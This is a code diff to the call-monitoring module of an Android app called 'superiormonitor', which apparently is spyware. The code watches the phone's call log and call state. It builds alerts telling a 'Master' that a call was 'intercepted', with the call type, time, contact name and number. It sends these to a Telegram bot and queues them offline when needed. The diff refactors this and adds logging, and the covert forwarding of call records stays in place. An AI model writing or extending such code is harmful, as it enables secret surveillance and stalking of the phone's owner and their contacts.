@@ -1,5 +1,7 @@
 package com.system.superiormonitor.monitor
 
+import com.system.superiormonitor.util.LogLevel
+
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
@@ -38,6 +40,7 @@ class CallMonitor(
     private val callObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
         override fun onChange(selfChange: Boolean) {
             super.onChange(selfChange)
+            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: DB change detected. Triggering check in 3s.")
             monitorScope.launch {
                 delay(3000)
                 processLatestCall()
@@ -49,10 +52,11 @@ class CallMonitor(
         override fun onReceive(ctx: Context?, intent: Intent?) {
             if (intent?.action == TelephonyManager.ACTION_PHONE_STATE_CHANGED) {
                 val state = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
-                LogManager.log(LogCategory.MONITOR, "Call Monitor: Phone State -> $state")
+                LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Phone State -> $state")
 
                 // Only trigger delay on IDLE (when call ends) to prevent premature historical checks
                 if (state == TelephonyManager.EXTRA_STATE_IDLE) {
+                    LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Call ended. Triggering check in 3s.")
                     monitorScope.launch {
                         delay(3000)
                         processLatestCall()
@@ -83,15 +87,16 @@ class CallMonitor(
                 }
             } catch (e: Exception) {
                 // Fallback — will process from current state
+                LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: Failed to establish baseline ID (${e.message})", LogLevel.ERROR)
             }
 
             context.contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callObserver)
             val filter = IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED)
             context.registerReceiver(callStateReceiver, filter)
             isRunning = true
-            LogManager.log(LogCategory.MONITOR, "Call Monitor Started.")
+            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Started.")
         } catch (e: SecurityException) {
-            LogManager.log(LogCategory.MONITOR, "Call Monitor Error: Missing Permissions.")
+            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: Missing Permissions.", LogLevel.ERROR)
         }
     }
 
@@ -102,9 +107,10 @@ class CallMonitor(
             context.unregisterReceiver(callStateReceiver)
             monitorJob.cancel()
             isRunning = false
-            LogManager.log(LogCategory.MONITOR, "Call Monitor Stopped.")
+            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Stopped.")
         } catch (e: Exception) {
             // Ignore if not registered
+            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: Shutdown failed (${e.message})", LogLevel.ERROR)
         }
     }
 
@@ -144,29 +150,15 @@ class CallMonitor(
                     val safeContactName = TelegramApi.escapeMarkdown(contactName)
                     val safeNumber = TelegramApi.escapeMarkdown(number)
 
-                    val output = """
-                        #Call
-                        ——————————
-                        👑 *Master, a new Call activity has been intercepted!*
-                        
-                        *Type* : $typeStr
-                        *Time* : $timeStr
-                        *Contact* : $safeContactName
-                        *Number* : `$safeNumber`
-                    """.trimIndent()
+                    val output = com.system.superiormonitor.bot.BotMessages.Alerts.buildCallMessage(
+                        typeStr, timeStr, safeContactName, safeNumber
+                    )
 
-                    val prefsManager = com.system.superiormonitor.data.PrefsManager.getInstance(context)
-                    if (TelegramApi.isApiReachable(context, prefsManager.botToken)) {
-                        onUpdate(output, "Markdown")
-                        LogManager.log(LogCategory.MONITOR, "Sent new call update for $typeStr call.")
-                        delay(3000)
-                    } else {
-                        val offlineDir = File(context.getExternalFilesDir(null), "call_alrt/offline")
-                        if (!offlineDir.exists()) offlineDir.mkdirs()
-                        val offlineFile = File(offlineDir, "offline_calls.txt")
-                        offlineFile.appendText(output + "\n\n")
-                        LogManager.log(LogCategory.MONITOR, "Device offline. Call update queued locally.")
-                    }
+                    com.system.superiormonitor.bot.OfflineManager.sendOrQueue(
+                        context, output, "call_alrt", "offline_calls.txt", onUpdate
+                    )
+                    LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor: Processed $typeStr call from $contactName")
+                    delay(3000)
 
                     if (id > lastProcessedId) {
                         lastProcessedId = id
@@ -174,9 +166,9 @@ class CallMonitor(
                 }
             }
         } catch (e: SecurityException) {
-            LogManager.log(LogCategory.MONITOR, "Call Monitor Error: Missing Permissions.")
+            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: Missing Permissions.", LogLevel.ERROR)
         } catch (e: Exception) {
-            LogManager.log(LogCategory.MONITOR, "Call Monitor Error: ${e.message}")
+            LogManager.log(LogCategory.BASIC_UPDATE, "Call Monitor Error: ${e.message}", LogLevel.ERROR)
         }
         }
     }
